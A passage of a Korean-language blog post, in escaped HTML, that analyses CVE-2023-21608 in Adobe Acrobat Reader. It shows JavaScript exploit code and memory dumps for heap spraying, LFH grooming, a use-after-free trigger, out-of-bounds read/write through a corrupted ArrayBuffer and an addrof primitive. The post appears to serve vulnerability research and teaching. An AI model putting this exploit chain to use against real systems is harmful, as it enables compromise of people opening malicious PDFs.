            arrs[i][k] = &lt;span class=&#34;hljs-number&#34;&gt;0x50515051&lt;/span&gt;;
        }
    }
}

&lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[*] spraying array buffer...&amp;quot;&lt;/span&gt;);

sprayArrBuffers();

&lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[*] pre-populating LFH...&amp;quot;&lt;/span&gt;);

groomLFH(&lt;span class=&#34;hljs-number&#34;&gt;68&lt;/span&gt;, &lt;span class=&#34;hljs-number&#34;&gt;5000&lt;/span&gt;);

&lt;span class=&#34;hljs-comment&#34;&gt;/*&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;Trigger the Bug&lt;/span&gt;
&lt;span class=&#34;hljs-comment&#34;&gt;*/&lt;/span&gt;&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;sprayArrBuffers&lt;/code&gt;&amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C;&amp;#xB294; 0xffe8 &amp;#xD06C;&amp;#xAE30;&amp;#xB97C; &amp;#xAC00;&amp;#xC9C0;&amp;#xB294; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xB97C; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; 0x20000048&amp;#xC5D0; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xAC00; &amp;#xD560;&amp;#xB2F9;&amp;#xB418;&amp;#xAC8C; &amp;#xB9CC;&amp;#xB4ED;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xB610;&amp;#xD55C; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; OOB Read/Write&amp;#xB85C; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &lt;code&gt;Array&lt;/code&gt;&amp;#xB97C; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xD558;&amp;#xC5EC; &amp;#xC778;&amp;#xC811;&amp;#xD55C; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xD560;&amp;#xB2F9;&amp;#xD558;&amp;#xACE0; &amp;#xC774;&amp;#xB294; &amp;#xCD94;&amp;#xD6C4;&amp;#xC5D0; &amp;#xC784;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C; &amp;#xC77D;&amp;#xAE30;/&amp;#xC4F0;&amp;#xAE30;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB418;&amp;#xB294; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;std::map&amp;lt;unsigned short,CAgg&amp;gt;::lower_bound&lt;/code&gt;&amp;#xC640;  &lt;code&gt;std::map&amp;lt;unsigned short,CAgg&amp;gt;::insert&lt;/code&gt;&amp;#xC758; &amp;#xB3D9;&amp;#xC791;&amp;#xC5D0; &amp;#xC758;&amp;#xD574; length&amp;#xAC00; &amp;#xB36E;&amp;#xC5B4; &amp;#xC4F0;&amp;#xC774;&amp;#xB3C4;&amp;#xB85D; &amp;#xD398;&amp;#xC774;&amp;#xB85C;&amp;#xB4DC;&amp;#xB97C; &amp;#xAD6C;&amp;#xC131;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xD6C4; &lt;code&gt;groomLFH&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C; &lt;code&gt;String&lt;/code&gt; &amp;#xB370;&amp;#xC774;&amp;#xD130; &amp;#xD560;&amp;#xB2F9;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xD799; &amp;#xADF8;&amp;#xB8E8;&amp;#xBC0D;&amp;#xC744; &amp;#xC218;&amp;#xD589;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xC5D0;&amp;#xB294; &lt;code&gt;%u0058%u2000&lt;/code&gt;&amp;#xC774; &amp;#xD3EC;&amp;#xD568;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xACE0; &lt;code&gt;unescape&lt;/code&gt;&amp;#xB85C; &amp;#xC778;&amp;#xD574; fake &lt;code&gt;map&lt;/code&gt;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xC778; 0x20000058&amp;#xB85C; &amp;#xBCC0;&amp;#xACBD;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;p&gt;&amp;#xBC84;&amp;#xADF8;&amp;#xAC00; &amp;#xD2B8;&amp;#xB9AC;&amp;#xAC70;&amp;#xB41C; &amp;#xC774;&amp;#xD6C4; &lt;code&gt;groomLFH&lt;/code&gt;&amp;#xC5D0;&amp;#xC11C; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB41C; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC774; &amp;#xBCC0;&amp;#xD658;&amp;#xB41C; &lt;code&gt;CAgg&lt;/code&gt;&amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xB4E4;&amp;#xC740; &amp;#xB2E4;&amp;#xC2DC; &amp;#xBCC0;&amp;#xD658;&amp;#xC744; &amp;#xAC70;&amp;#xCE58;&amp;#xAC8C; &amp;#xB418;&amp;#xB294;&amp;#xB370; &amp;#xC774;&amp;#xB54C; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xC62E;&amp;#xAE38; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xD560;&amp;#xB2F9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. brute-force&amp;#xB85C; &amp;#xC54C;&amp;#xC544;&amp;#xB0B8; &amp;#xD06C;&amp;#xAE30;&amp;#xC778; 68&amp;#xB85C; &amp;#xD799; &amp;#xADF8;&amp;#xB8E8;&amp;#xBC0D;&amp;#xC744; &amp;#xC9C4;&amp;#xD589;&amp;#xD558;&amp;#xBA74; &amp;#xC774; &amp;#xACFC;&amp;#xC815;&amp;#xC5D0;&amp;#xC11C; Use-After-Free&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &amp;#xBA54;&amp;#xBAA8;&amp;#xB9AC;&amp;#xB97C; &amp;#xC7AC;&amp;#xD560;&amp;#xB2F9;&amp;#xD558;&amp;#xC5EC; fake &lt;code&gt;map&lt;/code&gt;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC704;&amp;#xCE58;&amp;#xC2DC;&amp;#xD0AC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;2-Out-of-Bounds-Read-Write-via-Corrupted-ArrayBuffer&#34;&gt;&lt;a href=&#34;#2-Out-of-Bounds-Read-Write-via-Corrupted-ArrayBuffer&#34; class=&#34;headerlink&#34; title=&#34;2. Out-of-Bounds Read/Write via Corrupted ArrayBuffer&#34;&gt;&lt;/a&gt;2. Out-of-Bounds Read/Write via Corrupted ArrayBuffer&lt;/h2&gt;&lt;p&gt;length&amp;#xAC00; &amp;#xBCC0;&amp;#xC870;&amp;#xB41C; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xB97C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD55C; OOB Read/Write&amp;#xB85C; &amp;#xB2E4;&amp;#xB978; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xB97C; &amp;#xBCC0;&amp;#xC870;&amp;#xD558;&amp;#xC5EC; &amp;#xCD94;&amp;#xD6C4;&amp;#xC5D0; Arbitrary Address Read/Write&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;. &amp;#xC774;&amp;#xB97C; &amp;#xC704;&amp;#xD574; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xBCC0;&amp;#xC870;&amp;#xB41C; &amp;#xAE38;&amp;#xC774;&amp;#xB97C; &amp;#xAC00;&amp;#xC9C0;&amp;#xB294; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xB97C; &amp;#xCC3E;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; arrStart = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;
&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; corruptedTypedArr = &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;

&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; originalTargetStrAddr = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;,
    originalTargetDVAddr = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;;

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; bufs.length; i++) {
    &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (bufs[i].byteLength != ALLOC_SIZE) {
        &lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(
            &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[+] corrupted array buffer found at &amp;quot;&lt;/span&gt; +
                i +
                &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot; : length: &amp;quot;&lt;/span&gt; +
                bufs[i].byteLength +
                &lt;span class=&#34;hljs-string&#34;&gt;&amp;quot; : buf length: &amp;quot;&lt;/span&gt; +
                bufs.length
        );
        &lt;span class=&#34;hljs-keyword&#34;&gt;const&lt;/span&gt; uintArr = &lt;span class=&#34;hljs-keyword&#34;&gt;new&lt;/span&gt; &lt;span class=&#34;hljs-built_in&#34;&gt;Uint32Array&lt;/span&gt;(bufs[i]);

        &lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[*] checking leaked global array...&amp;quot;&lt;/span&gt;);

        &lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; x = ((bufs.length - i) * &lt;span class=&#34;hljs-number&#34;&gt;0xfff8&lt;/span&gt;) / &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;; x &amp;lt; uintArr.length; x++) {
            &lt;span class=&#34;hljs-keyword&#34;&gt;if&lt;/span&gt; (uintArr[x] == &lt;span class=&#34;hljs-number&#34;&gt;0x47484950&lt;/span&gt;) {
                arrStart = x - &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;;
                &lt;span class=&#34;hljs-built_in&#34;&gt;console&lt;/span&gt;.println(&lt;span class=&#34;hljs-string&#34;&gt;&amp;quot;[*] leaked global array found at index:&amp;quot;&lt;/span&gt; + arrStart);
                &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
            }
        }

        &lt;span class=&#34;hljs-comment&#34;&gt;// store for recovery&lt;/span&gt;
        originalTargetStrAddr = uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;];
        originalTargetDVAddr = uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;];

        &lt;span class=&#34;hljs-comment&#34;&gt;// corrupt for further primitives&lt;/span&gt;
        uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x47484951&lt;/span&gt;;
        uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;] = FAKE_STR;
        uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;] = FAKE_DV;

        corruptedTypedArr = uintArr;

        &lt;span class=&#34;hljs-keyword&#34;&gt;break&lt;/span&gt;;
    }
}&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB41C; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xB4E4;&amp;#xC758; length&amp;#xB97C; &amp;#xAC80;&amp;#xC0AC;&amp;#xD558;&amp;#xC5EC; &amp;#xD560;&amp;#xB2F9;&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD55C; &amp;#xD06C;&amp;#xAE30;&amp;#xC778; &lt;code&gt;ALLOC_SIZE&lt;/code&gt;(0xffe8)&amp;#xC640; &amp;#xAC19;&amp;#xC740;&amp;#xC9C0; &amp;#xBE44;&amp;#xAD50;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC73C;&amp;#xB85C; OOB Read/Write&amp;#xAC00; &amp;#xBC1C;&amp;#xC0DD;&amp;#xD558;&amp;#xB294; &lt;code&gt;corruptedTypedArr&lt;/code&gt;&amp;#xB97C; &amp;#xCC3E;&amp;#xC544;&amp;#xB0BC; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;sprayArrBuffers&lt;/code&gt; &amp;#xD568;&amp;#xC218;&amp;#xC5D0;&amp;#xC11C; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB41C; &amp;#xC778;&amp;#xC811;&amp;#xD55C; &lt;code&gt;Array&lt;/code&gt;&amp;#xB4E4;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACE0; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB41C; &lt;code&gt;Array&lt;/code&gt;&amp;#xC5D0;&amp;#xB294; &amp;#xC544;&amp;#xB798;&amp;#xC640; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xAC00; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xC5B4; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs apache&#34;&gt;&lt;span class=&#34;hljs-attribute&#34;&gt;24188270&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;00000000&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000&lt;/span&gt;f&lt;span class=&#34;hljs-number&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000&lt;/span&gt;f&lt;span class=&#34;hljs-number&#34;&gt;80&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;00000&lt;/span&gt;f&lt;span class=&#34;hljs-number&#34;&gt;80&lt;/span&gt;  ................
&lt;span class=&#34;hljs-attribute&#34;&gt;24188280&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;47484950&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;db&lt;span class=&#34;hljs-number&#34;&gt;3&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;420&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;85&lt;/span&gt;  PIHG.... .......
&lt;span class=&#34;hljs-attribute&#34;&gt;24188290&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;dda&lt;span class=&#34;hljs-number&#34;&gt;27&lt;/span&gt;c&lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;87&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt;  .&amp;apos;......QPQP....
&lt;span class=&#34;hljs-attribute&#34;&gt;241882a0&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt;  QPQP....QPQP....
&lt;span class=&#34;hljs-attribute&#34;&gt;241882b0&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt;  QPQP....QPQP....
&lt;span class=&#34;hljs-attribute&#34;&gt;241882c0&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt;  QPQP....QPQP....
&lt;span class=&#34;hljs-attribute&#34;&gt;241882d0&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt;  QPQP....QPQP....
&lt;span class=&#34;hljs-attribute&#34;&gt;241882e0&lt;/span&gt;  &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt; &lt;span class=&#34;hljs-number&#34;&gt;50515051&lt;/span&gt; ffffff&lt;span class=&#34;hljs-number&#34;&gt;81&lt;/span&gt;  QPQP....QPQP....
&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;Array&lt;/code&gt;&amp;#xC5D0;&amp;#xB294; &amp;#xB370;&amp;#xC774;&amp;#xD130; &amp;#xAC12;&amp;#xB9CC; &amp;#xC800;&amp;#xC7A5;&amp;#xB418;&amp;#xB294; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xC640; &amp;#xB2EC;&amp;#xB9AC; &amp;#xAC01; 4&amp;#xBC14;&amp;#xC774;&amp;#xD2B8;&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130; &amp;#xAC12;&amp;#xACFC; &amp;#xD0C0;&amp;#xC785;&amp;#xC744; &amp;#xB098;&amp;#xD0C0;&amp;#xB0B4;&amp;#xB294; &amp;#xD0DC;&amp;#xADF8; &amp;#xAC12;&amp;#xC73C;&amp;#xB85C; &amp;#xC774;&amp;#xB8E8;&amp;#xC5B4;&amp;#xC9C4; jsval&amp;#xC774; &amp;#xC800;&amp;#xC7A5;&amp;#xB429;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC544;&amp;#xB798;&amp;#xB294;  Adobe Acrobat Reader&amp;#xC5D0;&amp;#xC11C; &amp;#xC0AC;&amp;#xC6A9;&amp;#xD558;&amp;#xB294; Javascript &amp;#xC5D4;&amp;#xC9C4;&amp;#xC778; SpiderMonkey&amp;#xC5D0;&amp;#xC11C; jsval&amp;#xC744; &amp;#xD45C;&amp;#xD604;&amp;#xD558;&amp;#xB294; &amp;#xBC29;&amp;#xC2DD;&amp;#xC744; &amp;#xB098;&amp;#xD0C0;&amp;#xB0B8; &amp;#xADF8;&amp;#xB9BC;&amp;#xC785;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&lt;img src=&#34;/2024/08/04/pwndorei/1day1document_CVE-2023-21608/Untitled%206.png&#34; alt=&#34;Untitled&#34;&gt;&lt;/p&gt;
&lt;blockquote&gt;
&lt;p&gt;&amp;#xADF8;&amp;#xB9BC;.1: &lt;a href=&#34;https://downloads.immunityinc.com/infiltrate-archives/the_shadow_over_firefox_infiltrate_2015.pdf&#34;&gt;&amp;#xCD9C;&amp;#xCC98;&lt;/a&gt; Slide 10&lt;/p&gt;
&lt;/blockquote&gt;
&lt;p&gt;&amp;#xC774;&amp;#xB97C; &amp;#xCC38;&amp;#xACE0;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;Array&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xB41C; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &amp;#xBD84;&amp;#xC11D;&amp;#xD558;&amp;#xBA74; &lt;code&gt;0db3c420 ffffff85&lt;/code&gt;&amp;#xB294; &amp;#xBB38;&amp;#xC790;&amp;#xC5F4;&amp;#xC778; &lt;code&gt;targetStr&lt;/code&gt;&amp;#xC774;&amp;#xACE0; &lt;code&gt;0dda27c0 ffffff87&lt;/code&gt;&amp;#xB294; DataView&amp;#xC778; &lt;code&gt;targetDV&lt;/code&gt;&amp;#xC778; &amp;#xAC83;&amp;#xC744; &amp;#xC54C; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h3 id=&#34;Corrupt-Sparyed-Array&#34;&gt;&lt;a href=&#34;#Corrupt-Sparyed-Array&#34; class=&#34;headerlink&#34; title=&#34;Corrupt Sparyed Array&#34;&gt;&lt;/a&gt;Corrupt Sparyed Array&lt;/h3&gt;&lt;p&gt;&amp;#xBA3C;&amp;#xC800; &amp;#xBCC0;&amp;#xC870;&amp;#xB41C; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xC778;&amp;#xC811;&amp;#xD55C; &lt;code&gt;Array&lt;/code&gt;&amp;#xB97C; &amp;#xCC3E;&amp;#xAE30; &amp;#xC704;&amp;#xD574; OOB Read&amp;#xB97C; &amp;#xD65C;&amp;#xC6A9;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;OOB Read&amp;#xB85C; &amp;#xC77D;&amp;#xC740; &amp;#xB370;&amp;#xC774;&amp;#xD130;&amp;#xB97C; &lt;code&gt;Array[0]&lt;/code&gt;&amp;#xC5D0; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; 0x47484950&amp;#xACFC; &amp;#xBE44;&amp;#xAD50;&amp;#xD558;&amp;#xB294; &amp;#xAC83;&amp;#xC744; &amp;#xD1B5;&amp;#xD574; &amp;#xC2A4;&amp;#xD504;&amp;#xB808;&amp;#xC774;&amp;#xB41C; &lt;code&gt;Array&lt;/code&gt;&amp;#xC784;&amp;#xC744; &amp;#xC2DD;&amp;#xBCC4;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xACE0; OOB Read&amp;#xC5D0; &amp;#xC0AC;&amp;#xC6A9;&amp;#xB41C; &amp;#xC778;&amp;#xB371;&amp;#xC2A4;&amp;#xC5D0;&amp;#xC11C; 4&amp;#xB97C; &amp;#xBE7C;&amp;#xC11C; &lt;code&gt;Array&lt;/code&gt; &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xAC00; &amp;#xC704;&amp;#xCE58;&amp;#xD55C; &amp;#xC8FC;&amp;#xC18C;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; &amp;#xC778;&amp;#xB371;&amp;#xC2A4; &lt;code&gt;arrStart&lt;/code&gt;&amp;#xC5D0; &amp;#xC800;&amp;#xC7A5;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;p&gt;&amp;#xC774;&amp;#xD6C4; &amp;#xC544;&amp;#xB798;&amp;#xC758; &amp;#xCF54;&amp;#xB4DC;&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &lt;code&gt;Array&lt;/code&gt;&amp;#xC5D0; &amp;#xC811;&amp;#xADFC;&amp;#xD558;&amp;#xC5EC; &lt;code&gt;targetStr&lt;/code&gt;&amp;#xACFC; &lt;code&gt;targetDV&lt;/code&gt;&amp;#xB97C; &amp;#xAC00;&amp;#xB9AC;&amp;#xD0A4;&amp;#xB294; &amp;#xBD80;&amp;#xBD84;&amp;#xC744; &amp;#xAC01;&amp;#xAC01; &lt;code&gt;FAKE_STR&lt;/code&gt;&amp;#xACFC; &lt;code&gt;FAKE_DV&lt;/code&gt;&amp;#xB85C; &amp;#xBCC0;&amp;#xC870;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;originalTargetStrAddr = uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;];&lt;span class=&#34;hljs-comment&#34;&gt;// corrupted ArrayBuffer&lt;/span&gt;
originalTargetDVAddr = uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;];

&lt;span class=&#34;hljs-comment&#34;&gt;// corrupt for further primitives&lt;/span&gt;
uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;4&lt;/span&gt;] = &lt;span class=&#34;hljs-number&#34;&gt;0x47484951&lt;/span&gt;;
uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;6&lt;/span&gt;] = FAKE_STR; &lt;span class=&#34;hljs-comment&#34;&gt;// 0x20000058 + 0x100&lt;/span&gt;
uintArr[arrStart + &lt;span class=&#34;hljs-number&#34;&gt;8&lt;/span&gt;] = FAKE_DV; &lt;span class=&#34;hljs-comment&#34;&gt;//0x20000058 + 0x180&lt;/span&gt;

corruptedTypedArr = uintArr;

&lt;/code&gt;&lt;/pre&gt;
&lt;p&gt;&lt;code&gt;FAKE_STR&lt;/code&gt;&amp;#xACFC; &lt;code&gt;FAKE_DV&lt;/code&gt;&amp;#xB294; &amp;#xBCC0;&amp;#xC870;&amp;#xB41C; &lt;code&gt;ArrayBuffer&lt;/code&gt;&amp;#xC758; &amp;#xB370;&amp;#xC774;&amp;#xD130; &amp;#xC2DC;&amp;#xC791; &amp;#xC8FC;&amp;#xC18C;&amp;#xC778; 0x20000058&amp;#xB85C;&amp;#xBD80;&amp;#xD130; &amp;#xAC01;&amp;#xAC01; 0x100, 0x180 &amp;#xB9CC;&amp;#xD07C; &amp;#xB5A8;&amp;#xC5B4;&amp;#xC9C4; &amp;#xC704;&amp;#xCE58;&amp;#xC5D0; &amp;#xAD6C;&amp;#xC131;&amp;#xD569;&amp;#xB2C8;&amp;#xB2E4;.&lt;/p&gt;
&lt;h2 id=&#34;3-AddrOf-amp-poi-Primitives&#34;&gt;&lt;a href=&#34;#3-AddrOf-amp-poi-Primitives&#34; class=&#34;headerlink&#34; title=&#34;3. AddrOf &amp;amp; poi Primitives&#34;&gt;&lt;/a&gt;3. AddrOf &amp;amp; poi Primitives&lt;/h2&gt;&lt;h3 id=&#34;AddrOf-Primitive&#34;&gt;&lt;a href=&#34;#AddrOf-Primitive&#34; class=&#34;headerlink&#34; title=&#34;AddrOf Primitive&#34;&gt;&lt;/a&gt;AddrOf Primitive&lt;/h3&gt;&lt;p&gt;&amp;#xC784;&amp;#xC758;&amp;#xC758; Javascript &amp;#xC624;&amp;#xBE0C;&amp;#xC81D;&amp;#xD2B8;&amp;#xC758; &amp;#xC8FC;&amp;#xC18C;&amp;#xB97C; &amp;#xC720;&amp;#xCD9C;&amp;#xD558;&amp;#xAE30; &amp;#xC704;&amp;#xD55C; addrof&amp;#xB97C; &amp;#xBCC0;&amp;#xC870;&amp;#xB41C; &lt;code&gt;ArrayBuffer&lt;/code&gt;(&lt;code&gt;corruptedTypedArr&lt;/code&gt;)&amp;#xC640; &lt;code&gt;Array&lt;/code&gt;(&lt;code&gt;modifiedArr&lt;/code&gt;)&amp;#xB97C; &amp;#xD1B5;&amp;#xD574; &amp;#xAD6C;&amp;#xD604;&amp;#xD560; &amp;#xC218; &amp;#xC788;&amp;#xC2B5;&amp;#xB2C8;&amp;#xB2E4;. &lt;/p&gt;
&lt;pre&gt;&lt;code class=&#34;hljs jsx&#34;&gt;&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; modifiedArr = &lt;span class=&#34;hljs-literal&#34;&gt;null&lt;/span&gt;;

&lt;span class=&#34;hljs-keyword&#34;&gt;for&lt;/span&gt; (&lt;span class=&#34;hljs-keyword&#34;&gt;var&lt;/span&gt; i = &lt;span class=&#34;hljs-number&#34;&gt;0&lt;/span&gt;; i &amp;lt; arrs.length; i++) {
